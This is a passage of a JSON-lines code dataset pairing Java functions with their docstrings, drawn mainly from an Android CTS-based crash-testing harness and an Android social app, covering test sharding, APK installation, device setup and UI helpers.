mClassName));\n\t\t}\n\t} else if (mContinueSessionId != null) {\n\t\t// create an in-memory derived plan that contains the notExecuted\n\t\t// tests from previous\n\t\t// session\n\t\t// use timestamp as plan name so it will hopefully be unique\n\t\tString uniquePlanName = Long.toString(System.currentTimeMillis());\n\t\tPlanCreator planCreator = new PlanCreator(uniquePlanName,\n\t\t\t\tmContinueSessionId, CtsTestStatus.NOT_EXECUTED);\n\t\tITestPlan plan = createPlan(planCreator);\n\t\tfor (String uri : plan.getTestUris()) {\n\t\t\tif (!mExcludedPackageNames.contains(uri)) {\n\t\t\t\tITestPackageDef testPackage = testRepo.getTestPackage(uri);\n\t\t\t\ttestPackage.setExcludedTestFilter(plan\n\t\t\t\t\t\t.getExcludedTestFilter(uri));\n\t\t\t\ttestPkgDefs.add(testPackage);\n\t\t\t}\n\t\t}\n\t} else {\n\t\t// should never get here - was checkFields() not called?\n\t\tthrow new IllegalStateException(\"nothing to run?\");\n\t}\n\treturn testPkgDefs;\n}", "path": "src\\com\\android\\cts\\tradefed\\testtype\\CtsTest.java", "repo_name": "DoctorQ/CrashMonkey4Android", "stars": 100, "license": "None", "language": "java", "size": 4919}
{"docstring": "/**\n * Check the validity of the CTS build file system structure.\n * @throws FileNotFoundException if any major directories are missing\n */\n", "func_signal": "public void validateStructure() throws FileNotFoundException", "code": "{\n    if (!getCtsDir().exists()) {\n        throw new FileNotFoundException(String.format(\n                \"CTS install folder %s does not exist\", getCtsDir().getAbsolutePath()));\n    }\n    if (!getTestCasesDir().exists()) {\n        throw new FileNotFoundException(String.format(\n                \"CTS test cases folder %s does not exist\",\n                getTestCasesDir().getAbsolutePath()));\n    }\n    if (!getTestPlansDir().exists()) {\n        throw new FileNotFoundException(String.format(\n                \"CTS test plans folder %s does not exist\",\n                getTestPlansDir().getAbsolutePath()));\n    }\n}", "path": "src\\com\\android\\cts\\tradefed\\build\\CtsBuildHelper.java", "repo_name": "DoctorQ/CrashMonkey4Android", "stars": 100, "license": "None", "language": "java", "size": 4919}
{"docstring": "/**\n * Utility method to extract PTS result from test metrics\n * @param testMetrics\n * @return result or null if not found\n */\n", "func_signal": "public static String getPtsResultFromMetrics(Map<String, String> testMetrics)", "code": "{\n    for (Map.Entry<String, String> entry: testMetrics.entrySet()) {\n        if (PTS_RESULT_KEY.equals(entry.getKey())) {\n            return entry.getValue();\n        }\n    }\n    return null;\n}", "path": "src\\com\\android\\cts\\tradefed\\result\\PtsReportUtil.java", "repo_name": "DoctorQ/CrashMonkey4Android", "stars": 100, "license": "None", "language": "java", "size": 4919}
{"docstring": "/**\n * {@inheritDoc}\n */\n", "func_signal": "@Override\npublic void run(ITestInvocationListener listener)\n\t\tthrows DeviceNotAvailableException", "code": "{\n\tif (getDevice() == null) {\n\t\tthrow new IllegalArgumentException(\"missing device\");\n\t}\n\n\tif (mRemainingTestPkgs == null) {\n\t\tcheckFields();\n\t\tmRemainingTestPkgs = buildTestsToRun();\n\t}\n\tif (mBugreport) {\n\t\tFailedTestBugreportGenerator bugListener = new FailedTestBugreportGenerator(\n\t\t\t\tlistener, getDevice());\n\t\tlistener = bugListener;\n\t}\n\tif (mScreenshotOnFailures) {\n\t\tFailedTestScreenshotGenerator screenListener = new FailedTestScreenshotGenerator(\n\t\t\t\tlistener, getDevice());\n\t\tlistener = screenListener;\n\t}\n\tif (mLogcatOnFailures) {\n\t\tFailedTestLogcatGenerator logcatListener = new FailedTestLogcatGenerator(\n\t\t\t\tlistener, getDevice(), mMaxLogcatBytes);\n\t\tlistener = logcatListener;\n\t}\n\n\t// collect and install the prerequisiteApks first, to save time when\n\t// multiple test\n\t// packages are using the same prerequisite apk (I'm looking at you,\n\t// CtsTestStubs!)\n\tCollection<String> prerequisiteApks = getPrerequisiteApks(mRemainingTestPkgs);\n\tCollection<String> uninstallPackages = getPrerequisitePackageNames(mRemainingTestPkgs);\n\tResultFilter filter = new ResultFilter(listener, mRemainingTestPkgs);\n\n\ttry {\n\t\tinstallPrerequisiteApks(prerequisiteApks);\n\n\t\t// always collect the device info, even for resumed runs, since test\n\t\t// will likely be\n\t\t// running on a different device\n\t\tcollectDeviceInfo(getDevice(), mCtsBuild, listener);\n\t\tif (mRemainingTestPkgs.size() > 1 && !mDisableReboot) {\n\t\t\tLog.i(LOG_TAG, \"Initial reboot for multiple packages\");\n\t\t\trebootDevice();\n\t\t}\n\t\tmPrevRebootTime = System.currentTimeMillis();\n\n\t\twhile (!mRemainingTestPkgs.isEmpty()) {\n\t\t\tTestPackage knownTests = mRemainingTestPkgs.get(0);\n\n\t\t\tIRemoteTest test = knownTests.getTestForPackage();\n\t\t\tif (test instanceof IDeviceTest) {\n\t\t\t\t((IDeviceTest) test).setDevice(getDevice());\n\t\t\t}\n\t\t\tif (test instanceof IBuildReceiver) {\n\t\t\t\t((IBuildReceiver) test).setBuild(mBuildInfo);\n\t\t\t}\n\n\t\t\tforwardPackageDetails(knownTests.getPackageDef(), listener);\n\t\t\ttest.run(filter);\n\t\t\tmRemainingTestPkgs.remove(0);\n\t\t\tif (mRemainingTestPkgs.size() > 0) {\n\t\t\t\trebootIfNecessary(knownTests, mRemainingTestPkgs.get(0));\n\t\t\t\t// remove artifacts like status bar from the previous test.\n\t\t\t\t// But this cannot dismiss dialog popped-up.\n\t\t\t\tchangeToHomeScreen();\n\t\t\t}\n\t\t}\n\n\t\tif (mScreenshot) {\n\t\t\tInputStreamSource screenshotSource = getDevice()\n\t\t\t\t\t.getScreenshot();\n\t\t\ttry {\n\t\t\t\tlistener.testLog(\"screenshot\", LogDataType.PNG,\n\t\t\t\t\t\tscreenshotSource);\n\t\t\t} finally {\n\t\t\t\tscreenshotSource.cancel();\n\t\t\t}\n\t\t}\n\n\t\tuninstallPrequisiteApks(uninstallPackages);\n\n\t} finally {\n\t\tfilter.reportUnexecutedTests();\n\t}\n}", "path": "src\\com\\android\\cts\\tradefed\\testtype\\CtsTest.java", "repo_name": "DoctorQ/CrashMonkey4Android", "stars": 100, "license": "None", "language": "java", "size": 4919}
{"docstring": "/**\n * Adds a test package to the list of packages to test\n *\n * @param testList\n * @param testPkgDef\n */\n", "func_signal": "private void addTestPackage(List<TestPackage> testList,\n\t\tITestPackageDef testPkgDef)", "code": "{\n\tIRemoteTest testForPackage = testPkgDef.createTest(mCtsBuild\n\t\t\t.getTestCasesDir());\n\tif (testForPackage != null) {\n\t\tCollection<TestIdentifier> knownTests = testPkgDef.getTests();\n\t\ttestList.add(new TestPackage(testPkgDef, testForPackage, knownTests));\n\t}\n}", "path": "src\\com\\android\\cts\\tradefed\\testtype\\CtsTest.java", "repo_name": "DoctorQ/CrashMonkey4Android", "stars": 100, "license": "None", "language": "java", "size": 4919}
{"docstring": "/**\n * Forward the digest and package name to the listener as a metric\n *\n * @param listener\n */\n", "func_signal": "private void forwardPackageDetails(ITestPackageDef def,\n\t\tITestInvocationListener listener)", "code": "{\n\tMap<String, String> metrics = new HashMap<String, String>(2);\n\tmetrics.put(PACKAGE_NAME_METRIC, def.getName());\n\tmetrics.put(PACKAGE_DIGEST_METRIC, def.getDigest());\n\tlistener.testRunStarted(def.getUri(), 0);\n\tlistener.testRunEnded(0, metrics);\n}", "path": "src\\com\\android\\cts\\tradefed\\testtype\\CtsTest.java", "repo_name": "DoctorQ/CrashMonkey4Android", "stars": 100, "license": "None", "language": "java", "size": 4919}
{"docstring": "/**\n * {@inheritDoc}\n */\n", "func_signal": "@Override\npublic void setUp(ITestDevice device, IBuildInfo buildInfo) throws TargetSetupError,\n        DeviceNotAvailableException", "code": "{\n    if (!(buildInfo instanceof IFolderBuildInfo)) {\n        throw new IllegalArgumentException(\"Provided buildInfo is not a IFolderBuildInfo\");\n    }\n    CLog.i(\"Setting up %s to run CTS tests\", device.getSerialNumber());\n\n    IFolderBuildInfo ctsBuild = (IFolderBuildInfo)buildInfo;\n    try {\n        CtsBuildHelper buildHelper = new CtsBuildHelper(ctsBuild.getRootDir());\n\n        if (!device.enableAdbRoot()) {\n            throw new TargetSetupError(String.format(\n                    \"Failed to set root on device %s.\", device.getSerialNumber()));\n        }\n\n        // perform CTS setup steps that only work if adb is root\n        SettingsToggler.setSecureInt(device, \"mock_location\", 1);\n        enableDeviceAdmin(device, buildHelper);\n        // This is chrome specific setting to disable the first screen.\n        // For other browser, it will not do anything.\n        device.executeShellCommand(\n                \"echo \\\"chrome --disable-fre\\\" > /data/local/chrome-command-line\");\n        // end root setup steps\n    } catch (FileNotFoundException e) {\n        throw new TargetSetupError(\"Invalid CTS installation\", e);\n    }\n}", "path": "src\\com\\android\\cts\\tradefed\\targetprep\\CtsRootDeviceSetup.java", "repo_name": "DoctorQ/CrashMonkey4Android", "stars": 100, "license": "None", "language": "java", "size": 4919}
{"docstring": "// \u521b\u5efa\u62a5\u544a\n", "func_signal": "public void createReporter()", "code": "{\n\tString index_xsl = new File(reporterDir, MONKEY_RESULT_RESOURCES[0])\n\t\t\t.getAbsolutePath();\n\tString result_xsl = new File(reporterDir, MONKEY_RESULT_RESOURCES[2])\n\t\t\t.getAbsolutePath();\n\tString trace_xsl = new File(reporterDir, MONKEY_RESULT_RESOURCES[3])\n\t\t\t.getAbsolutePath();\n\tString xml = mXmlFile.getAbsolutePath();\n\tString indeHtml = new File(reporterDir, \"index.html\").getAbsolutePath();\n\tString resultHtml = new File(reporterDir, \"result.html\")\n\t\t\t.getAbsolutePath();\n\tString traceHtml = new File(reporterDir, \"trace.html\")\n\t\t\t.getAbsolutePath();\n\n\ttransferToHtml(result_xsl, xml, resultHtml);\n\ttransferToHtml(index_xsl, xml, indeHtml);\n\ttransferToHtml(trace_xsl, xml, traceHtml);\n\n}", "path": "src\\com\\android\\cts\\tradefed\\result\\MonkeyReporter.java", "repo_name": "DoctorQ/CrashMonkey4Android", "stars": 100, "license": "None", "language": "java", "size": 4919}
{"docstring": "/**\n * Uninstalls the collection of android package names from device.\n *\n * @param uninstallPackages\n */\n", "func_signal": "private void uninstallPrequisiteApks(Collection<String> uninstallPackages)\n\t\tthrows DeviceNotAvailableException", "code": "{\n\tfor (String pkgName : uninstallPackages) {\n\t\tgetDevice().uninstallPackage(pkgName);\n\t}\n}", "path": "src\\com\\android\\cts\\tradefed\\testtype\\CtsTest.java", "repo_name": "DoctorQ/CrashMonkey4Android", "stars": 100, "license": "None", "language": "java", "size": 4919}
{"docstring": "// \u5982\u679c\u53ea\u4f20xml\u6587\u4ef6\u8def\u5f84\uff0c\u90a3\u4e48\u4fdd\u5b58\u7684\u76ee\u5f55\u5c31\u5728xml\u540c\u7ea7\u76ee\u5f55\n", "func_signal": "public MonkeyReporter(File xmlFile, File logDir)", "code": "{\n\tthis.mXmlFile = xmlFile;\n\tif (mXmlFile == null || !mXmlFile.exists())\n\t\treturn;\n\tthis.mSaveFile = mXmlFile.getParentFile();\n\tmLogDir = logDir;\n\tinit();\n}", "path": "src\\com\\android\\cts\\tradefed\\result\\MonkeyReporter.java", "repo_name": "DoctorQ/CrashMonkey4Android", "stars": 100, "license": "None", "language": "java", "size": 4919}
{"docstring": "/**\n * Filter the list of tests based on rules in this filter\n *\n * @param tests the list of tests to filter\n * @return a new sorted list of tests that passed the filter\n */\n", "func_signal": "public Collection<TestIdentifier> filter(Collection<TestIdentifier > tests)", "code": "{\n    List<TestIdentifier> filteredTests = new ArrayList<TestIdentifier>(tests.size());\n    for (TestIdentifier test : tests) {\n        if (mIncludedClass != null && !test.getClassName().equals(mIncludedClass)) {\n            // skip\n            continue;\n        }\n        if (mIncludedMethod != null && !test.getTestName().equals(mIncludedMethod)) {\n            // skip\n            continue;\n        }\n        if (mExcludedClasses.contains(test.getClassName())) {\n            // skip\n            continue;\n        }\n        if (mExcludedTests.contains(test)) {\n            // skip\n            continue;\n        }\n        filteredTests.add(test);\n    }\n    Collections.sort(filteredTests, new TestIdComparator());\n    return filteredTests;\n}", "path": "src\\com\\android\\cts\\tradefed\\testtype\\TestFilter.java", "repo_name": "DoctorQ/CrashMonkey4Android", "stars": 100, "license": "None", "language": "java", "size": 4919}
{"docstring": "/**\n * Install the collection of test apk file names\n *\n * @param prerequisiteApks\n * @throws DeviceNotAvailableException\n */\n", "func_signal": "private void installPrerequisiteApks(Collection<String> prerequisiteApks)\n\t\tthrows DeviceNotAvailableException", "code": "{\n\tfor (String apkName : prerequisiteApks) {\n\t\ttry {\n\t\t\tFile apkFile = mCtsBuild.getTestApp(apkName);\n\t\t\tString errorCode = getDevice().installPackage(apkFile, true);\n\t\t\tif (errorCode != null) {\n\t\t\t\tCLog.e(\"Failed to install %s. Reason: %s\", apkName,\n\t\t\t\t\t\terrorCode);\n\t\t\t}\n\t\t} catch (FileNotFoundException e) {\n\t\t\tCLog.e(\"Could not find test apk %s\", apkName);\n\t\t}\n\t}\n}", "path": "src\\com\\android\\cts\\tradefed\\testtype\\CtsTest.java", "repo_name": "DoctorQ/CrashMonkey4Android", "stars": 100, "license": "None", "language": "java", "size": 4919}
{"docstring": "/**\n * {@inheritDoc}\n */\n", "func_signal": "@Override\npublic Collection<IRemoteTest> split()", "code": "{\n\tif (mShards <= 1) {\n\t\treturn null;\n\t}\n\tcheckFields();\n\tList<TestPackage> allTests = buildTestsToRun();\n\n\tif (allTests.size() <= 1) {\n\t\tLog.w(LOG_TAG, \"no tests to shard!\");\n\t\treturn null;\n\t}\n\n\t// treat shardQueue as a circular queue, to sequentially distribute\n\t// tests among shards\n\tQueue<IRemoteTest> shardQueue = new LinkedList<IRemoteTest>();\n\t// don't create more shards than the number of tests we have!\n\tfor (int i = 0; i < mShards && i < allTests.size(); i++) {\n\t\tCtsTest shard = new CtsTest();\n\t\tshard.mRemainingTestPkgs = new LinkedList<TestPackage>();\n\t\tshardQueue.add(shard);\n\t}\n\twhile (!allTests.isEmpty()) {\n\t\tTestPackage testPair = allTests.remove(0);\n\t\tCtsTest shard = (CtsTest) shardQueue.poll();\n\t\tshard.mRemainingTestPkgs.add(testPair);\n\t\tshardQueue.add(shard);\n\t}\n\treturn shardQueue;\n}", "path": "src\\com\\android\\cts\\tradefed\\testtype\\CtsTest.java", "repo_name": "DoctorQ/CrashMonkey4Android", "stars": 100, "license": "None", "language": "java", "size": 4919}
{"docstring": "/**\n * @return a {@link File} representing the test plan with given name. note: no attempt will be\n * made to ensure the plan actually exists\n * @throws FileNotFoundException if plans directory does not exist\n */\n", "func_signal": "public File getTestPlanFile(String planName) throws FileNotFoundException", "code": "{\n    String ctsPlanRelativePath = String.format(\"%s.xml\", planName);\n    return new File(getTestPlansDir(), ctsPlanRelativePath);\n}", "path": "src\\com\\android\\cts\\tradefed\\build\\CtsBuildHelper.java", "repo_name": "DoctorQ/CrashMonkey4Android", "stars": 100, "license": "None", "language": "java", "size": 4919}
{"docstring": "/**\n * Helper method to perform exclusive or on list of boolean arguments\n *\n * @param args\n *            set of booleans on which to perform exclusive or\n * @return <code>true</code> if one and only one of <var>args</code> is\n *         <code>true</code>. Otherwise return <code>false</code>.\n */\n", "func_signal": "private boolean xor(boolean... args)", "code": "{\n\tboolean currentVal = args[0];\n\tfor (int i = 1; i < args.length; i++) {\n\t\tif (currentVal && args[i]) {\n\t\t\treturn false;\n\t\t}\n\t\tcurrentVal |= args[i];\n\t}\n\treturn currentVal;\n}", "path": "src\\com\\android\\cts\\tradefed\\testtype\\CtsTest.java", "repo_name": "DoctorQ/CrashMonkey4Android", "stars": 100, "license": "None", "language": "java", "size": 4919}
{"docstring": "/**\n * This allows you to add extra LoadingLayout instances to this proxy. This\n * is only necessary if you keep your own instances, and want to have them\n * included in any\n * {@link PullToRefreshBase#createLoadingLayoutProxy(boolean, boolean)\n * createLoadingLayoutProxy(...)} calls.\n * \n * @param layout - LoadingLayout to have included.\n */\n", "func_signal": "public void addLayout(LoadingLayout layout)", "code": "{\n\tif (null != layout) {\n\t\tmLoadingLayouts.add(layout);\n\t}\n}", "path": "src\\com\\handmark\\pulltorefresh\\library\\LoadingLayoutProxy.java", "repo_name": "bmob/Wonderful2", "stars": 94, "license": "None", "language": "java", "size": 4401}
{"docstring": "/**\n * \u5224\u65ad\u7528\u6237\u662f\u5426\u767b\u5f55\n * @return\n */\n", "func_signal": "private boolean isLogined()", "code": "{\n\tBmobUser user = BmobUser.getCurrentUser(mContext, User.class);\n\tif(user != null){\n\t\treturn true;\n\t}\n\treturn false;\n}", "path": "src\\com\\xgr\\wonderful\\ui\\SettingsFragment.java", "repo_name": "bmob/Wonderful2", "stars": 94, "license": "None", "language": "java", "size": 4401}
{"docstring": "/* Emulating Honeycomb, setdisplayHomeAsUpEnabled takes a boolean\n * and toggles whether the \"home\" view should have a little triangle\n * indicating \"up\" */\n", "func_signal": "public void setDisplayHomeAsUpEnabled(boolean show)", "code": "{\n    mBackIndicator.setVisibility(show? View.VISIBLE : View.GONE);\n//        mBackIndicator.setBackgroundResource(R.drawable.actionbar_back_indicator);\n    mBackIndicator.setImageResource(show?R.drawable.back_indicator:android.R.color.transparent);\n}", "path": "src\\com\\markupartist\\android\\widget\\ActionBar.java", "repo_name": "bmob/Wonderful2", "stars": 94, "license": "None", "language": "java", "size": 4401}
{"docstring": "/**\n * Taken from the AOSP ScrollView source\n */\n", "func_signal": "private int getScrollRange()", "code": "{\n\tint scrollRange = 0;\n\tif (getChildCount() > 0) {\n\t\tView child = getChildAt(0);\n\t\tscrollRange = Math.max(0, child.getWidth() - (getWidth() - getPaddingLeft() - getPaddingRight()));\n\t}\n\treturn scrollRange;\n}", "path": "src\\com\\handmark\\pulltorefresh\\library\\PullToRefreshHorizontalScrollView.java", "repo_name": "bmob/Wonderful2", "stars": 94, "license": "None", "language": "java", "size": 4401}
{"docstring": "/**\n * \u8bbe\u7f6e\u9ed8\u8ba4\u5206\u4eab\u53c2\u6570\n */\n", "func_signal": "public TencentShareEntity()", "code": "{\n    this(TencentShareConstants.TITLE, TencentShareConstants.IMG_URL, TencentShareConstants.TARGET_URL,\n        TencentShareConstants.SUMMARY, TencentShareConstants.COMMENT);\n}", "path": "src\\com\\xgr\\wonderful\\sns\\TencentShareEntity.java", "repo_name": "bmob/Wonderful2", "stars": 94, "license": "None", "language": "java", "size": 4401}
{"docstring": "// Register the fragment when the item is instantiated\n", "func_signal": "@Override\npublic Object instantiateItem(ViewGroup container, int position)", "code": "{\n\tFragment fragment = (Fragment) super.instantiateItem(container, position);\n\tregisteredFragments.put(position, fragment);\n\treturn fragment;\n}", "path": "src\\com\\xgr\\wonderful\\adapter\\SmartFragmentStatePagerAdapter.java", "repo_name": "bmob/Wonderful2", "stars": 94, "license": "None", "language": "java", "size": 4401}
{"docstring": "/**\n * Sets whether an indicator graphic should be displayed when the View is in\n * a state where a Pull-to-Refresh can happen. An example of this state is\n * when the Adapter View is scrolled to the top and the mode is set to\n * {@link Mode#PULL_FROM_START}\n * \n * @param showIndicator - true if the indicators should be shown.\n */\n", "func_signal": "public void setShowIndicator(boolean showIndicator)", "code": "{\n\tmShowIndicator = showIndicator;\n\n\tif (getShowIndicatorInternal()) {\n\t\t// If we're set to Show Indicator, add/update them\n\t\taddIndicatorViews();\n\t} else {\n\t\t// If not, then remove then\n\t\tremoveIndicatorViews();\n\t}\n}", "path": "src\\com\\handmark\\pulltorefresh\\library\\PullToRefreshAdapterViewBase.java", "repo_name": "bmob/Wonderful2", "stars": 94, "license": "None", "language": "java", "size": 4401}
{"docstring": "/**\n * Constructor\n * \n * @param context - Context\n */\n", "func_signal": "public SoundPullEventListener(Context context)", "code": "{\n\tmContext = context;\n\tmSoundMap = new HashMap<State, Integer>();\n}", "path": "src\\com\\handmark\\pulltorefresh\\library\\extras\\SoundPullEventListener.java", "repo_name": "bmob/Wonderful2", "stars": 94, "license": "None", "language": "java", "size": 4401}
{"docstring": "/**\n * Shows the provided logo to the left in the action bar.\n * \n * This is ment to be used instead of the setHomeAction and does not draw\n * a divider to the left of the provided logo.\n * \n * @param resId The drawable resource id\n */\n", "func_signal": "public void setHomeLogo(int resId)", "code": "{\n    // TODO: Add possibility to add an IntentAction as well.\n    mLogoView.setImageResource(resId);\n    mLogoView.setVisibility(View.VISIBLE);\n    mHomeLayout.setVisibility(View.GONE);\n}", "path": "src\\com\\markupartist\\android\\widget\\ActionBar.java", "repo_name": "bmob/Wonderful2", "stars": 94, "license": "None", "language": "java", "size": 4401}
{"docstring": "/**\n * Inflates a {@link View} with the given {@link Action}.\n * @param action the action to inflate\n * @return a view\n */\n", "func_signal": "private View inflateAction(Action action)", "code": "{\n    View view = mInflater.inflate(R.layout.actionbar_item, mActionsView, false);\n\n    ImageButton labelView =\n        (ImageButton) view.findViewById(R.id.actionbar_item);\n    labelView.setImageResource(action.getDrawable());\n\n    view.setTag(action);\n    view.setOnClickListener(this);\n    return view;\n}", "path": "src\\com\\markupartist\\android\\widget\\ActionBar.java", "repo_name": "bmob/Wonderful2", "stars": 94, "license": "None", "language": "java", "size": 4401}
{"docstring": "/**\n * \u83b7\u53d6/data/data/files\u76ee\u5f55\n * @param context\n * @return\n */\n", "func_signal": "public static File getFileDirectory(Context context)", "code": "{\n    File appCacheDir=null;\n    if(appCacheDir == null) {\n        appCacheDir=context.getFilesDir();\n    }\n    if(appCacheDir == null) {\n        String cacheDirPath=\"/data/data/\" + context.getPackageName() + \"/files/\";\n        appCacheDir=new File(cacheDirPath);\n    }\n    return appCacheDir;\n}", "path": "src\\com\\xgr\\wonderful\\utils\\CacheUtils.java", "repo_name": "bmob/Wonderful2", "stars": 94, "license": "None", "language": "java", "size": 4401}
{"docstring": "/**\n * \u6839\u636e\u65f6\u95f4\u8fdb\u884c\u9875\u9762\u8df3\u8f6c\n */\n", "func_signal": "private void redirectByTime()", "code": "{\n\tnew Handler().postDelayed(new Runnable() {\n\t\t\n\t\t@Override\n\t\tpublic void run() {\n\t\t\t// TODO Auto-generated method stub\n\t\t\tredictToActivity(SplashActivity.this, MainActivity.class, null);\n\t\t\tfinish();\n\t\t}\n\t}, DELAY_TIME);\n}", "path": "src\\com\\xgr\\wonderful\\ui\\SplashActivity.java", "repo_name": "bmob/Wonderful2", "stars": 94, "license": "None", "language": "java", "size": 4401}
{"docstring": "/**\n * Adds a new {@link Action}.\n * @param action the action to add\n */\n", "func_signal": "public void addAction(Action action)", "code": "{\n    final int index = mActionsView.getChildCount();\n    addAction(action, index);\n}", "path": "src\\com\\markupartist\\android\\widget\\ActionBar.java", "repo_name": "bmob/Wonderful2", "stars": 94, "license": "None", "language": "java", "size": 4401}
{"docstring": "/**\n * Adds a list of {@link Action}s.\n * @param actionList the actions to add\n */\n", "func_signal": "public void addActions(ActionList actionList)", "code": "{\n    int actions = actionList.size();\n    for (int i = 0; i < actions; i++) {\n        addAction(actionList.get(i));\n    }\n}", "path": "src\\com\\markupartist\\android\\widget\\ActionBar.java", "repo_name": "bmob/Wonderful2", "stars": 94, "license": "None", "language": "java", "size": 4401}
{"docstring": "/**\n * \u8bbe\u7f6e\u52a8\u6001\u5206\u4eab\u53c2\u6570\n * @param title\n * @param imgUrl\n * @param targetUrl\n * @param summary\n */\n", "func_signal": "public TencentShareEntity(String title, String imgUrl, String targetUrl, String summary, String comment)", "code": "{\n    this.title=title;\n    this.imgUrl=imgUrl;\n    this.targetUrl=targetUrl;\n    this.summary=summary;\n    this.comment=comment;\n}", "path": "src\\com\\xgr\\wonderful\\sns\\TencentShareEntity.java", "repo_name": "bmob/Wonderful2", "stars": 94, "license": "None", "language": "java", "size": 4401}
{"docstring": "/**\n * Sets the Empty View to be used by the Adapter View.\n * <p/>\n * We need it handle it ourselves so that we can Pull-to-Refresh when the\n * Empty View is shown.\n * <p/>\n * Please note, you do <strong>not</strong> usually need to call this method\n * yourself. Calling setEmptyView on the AdapterView will automatically call\n * this method and set everything up. This includes when the Android\n * Framework automatically sets the Empty View based on it's ID.\n * \n * @param newEmptyView - Empty View to be used\n */\n", "func_signal": "public final void setEmptyView(View newEmptyView)", "code": "{\n\tFrameLayout refreshableViewWrapper = getRefreshableViewWrapper();\n\n\tif (null != newEmptyView) {\n\t\t// New view needs to be clickable so that Android recognizes it as a\n\t\t// target for Touch Events\n\t\tnewEmptyView.setClickable(true);\n\n\t\tViewParent newEmptyViewParent = newEmptyView.getParent();\n\t\tif (null != newEmptyViewParent && newEmptyViewParent instanceof ViewGroup) {\n\t\t\t((ViewGroup) newEmptyViewParent).removeView(newEmptyView);\n\t\t}\n\n\t\t// We need to convert any LayoutParams so that it works in our\n\t\t// FrameLayout\n\t\tFrameLayout.LayoutParams lp = convertEmptyViewLayoutParams(newEmptyView.getLayoutParams());\n\t\tif (null != lp) {\n\t\t\trefreshableViewWrapper.addView(newEmptyView, lp);\n\t\t} else {\n\t\t\trefreshableViewWrapper.addView(newEmptyView);\n\t\t}\n\t}\n\n\tif (mRefreshableView instanceof EmptyViewMethodAccessor) {\n\t\t((EmptyViewMethodAccessor) mRefreshableView).setEmptyViewInternal(newEmptyView);\n\t} else {\n\t\tmRefreshableView.setEmptyView(newEmptyView);\n\t}\n\tmEmptyView = newEmptyView;\n}", "path": "src\\com\\handmark\\pulltorefresh\\library\\PullToRefreshAdapterViewBase.java", "repo_name": "bmob/Wonderful2", "stars": 94, "license": "None", "language": "java", "size": 4401}
{"docstring": "// Unregister when the item is inactive\n", "func_signal": "@Override\npublic void destroyItem(ViewGroup container, int position, Object object)", "code": "{\n\tregisteredFragments.remove(position);\n\tsuper.destroyItem(container, position, object);\n}", "path": "src\\com\\xgr\\wonderful\\adapter\\SmartFragmentStatePagerAdapter.java", "repo_name": "bmob/Wonderful2", "stars": 94, "license": "None", "language": "java", "size": 4401}
{"docstring": "/*\");\n\t\t\tstartActivityForResult(intent, REQUEST_CODE_ALBUM);\n\t\t\tbreak;\n\t\tcase R.id.take_layout:\n\t\t\tDate date = new Date(System.currentTimeMillis());\n\t\t\tdateTime = date.getTime() + \"\";\n\t\t\tFile f = new File(CacheUtils.getCacheDirectory(mContext, true, \"pic\") + dateTime);\n\t\t\tif (f.exists()) {\n\t\t\t\tf.delete();\n\t\t\t}\n\t\t\ttry {\n\t\t\t\tf.createNewFile();\n\t\t\t} catch (IOException e) {\n\t\t\t\te.printStackTrace();\n\t\t\t}\n\t\t\tUri uri = Uri.fromFile(f);\n\t\t\tLog.e(\"uri\", uri + \"\");\n\t\t\t\n\t\t\tIntent camera = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);\n\t\t\tcamera.putExtra(MediaStore.EXTRA_OUTPUT, uri);\n\t\t\tstartActivityForResult(camera, REQUEST_CODE_CAMERA);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tbreak;\n\t\t}\n\t}\n\n\t/*\n\t * \u53d1\u8868\u5e26\u56fe\u7247\n\t */\n", "func_signal": "private void publish(final String commitContent)", "code": "{\n\t\t\n\t\tfinal BmobFile figureFile = new BmobFile(QiangYu.class, new File(targeturl));\n\t\tfigureFile.upload(mContext, new UploadFileListener() {\n\t\t\t\n\t\t\t@Override\n\t\t\tpublic void onSuccess() {\n\t\t\t\t// TODO Auto-generated method stub\n\t\t\t\tLogUtils.i(TAG, \"\u4e0a\u4f20\u6587\u4ef6\u6210\u529f\u3002\"+figureFile.getFileUrl());\t\n\t\t\t\tpublishWithoutFigure(commitContent, figureFile);\n\t\t\t\t\n\t\t\t}\n\n\t\t\t@Override\n\t\t\tpublic void onProgress(Integer arg0) {\n\t\t\t\t// TODO Auto-generated method stub\n\t\t\t\t\n\t\t\t}\n\n\t\t\t@Override\n\t\t\tpublic void onFailure(int arg0, String arg1) {\n\t\t\t\t// TODO Auto-generated method stub\n\t\t\t\tLogUtils.i(TAG, \"\u4e0a\u4f20\u6587\u4ef6\u5931\u8d25\u3002\"+arg1);\n\t\t\t}\n\t\t});\n\t\n\t}", "path": "src\\com\\xgr\\wonderful\\ui\\EditActivity.java", "repo_name": "bmob/Wonderful2", "stars": 94, "license": "None", "language": "java", "size": 4401}
{"docstring": "/**\n * Remove a action from the action bar.\n * @param action The action to remove\n */\n", "func_signal": "public void removeAction(Action action)", "code": "{\n    int childCount = mActionsView.getChildCount();\n    for (int i = 0; i < childCount; i++) {\n        View view = mActionsView.getChildAt(i);\n        if (view != null) {\n            final Object tag = view.getTag();\n            if (tag instanceof Action && tag.equals(action)) {\n                mActionsView.removeView(view);\n            }\n        }\n    }\n}", "path": "src\\com\\markupartist\\android\\widget\\ActionBar.java", "repo_name": "bmob/Wonderful2", "stars": 94, "license": "None", "language": "java", "size": 4401}
{"docstring": "/**\n * \n * @param context\n * @param assetsPah:\"fonts/xxx.ttf\"\n * @return\n * usage:textView.setTypeface(typeface);\n */\n", "func_signal": "public static Typeface getTypeface(Context context,String assetsPah)", "code": "{\n\tTypeface typeface = Typeface.createFromAsset(context.getAssets(), assetsPah);\n\treturn typeface;\n}", "path": "src\\com\\xgr\\wonderful\\utils\\CommonUtils.java", "repo_name": "bmob/Wonderful2", "stars": 94, "license": "None", "language": "java", "size": 4401}
{"docstring": "//BEGIN --- texture utils section ---\n", "func_signal": "private int generateTextureID(GL2 inGL)", "code": "{\n        int[] result = new int[1];\n        inGL.glGenTextures(1, result, 0);\n        System.out.println(\"ALLOCATED NEW JOGL TEXTURE ID=\"+result[0]);\n        return result[0];\n    }", "path": "code_demos_elektronenmultiplizierer\\src\\GL3_Elektronenmultiplizierer_Port.java", "repo_name": "demoscenepassivist/SocialCoding", "stars": 64, "license": "None", "language": "java", "size": 206837}
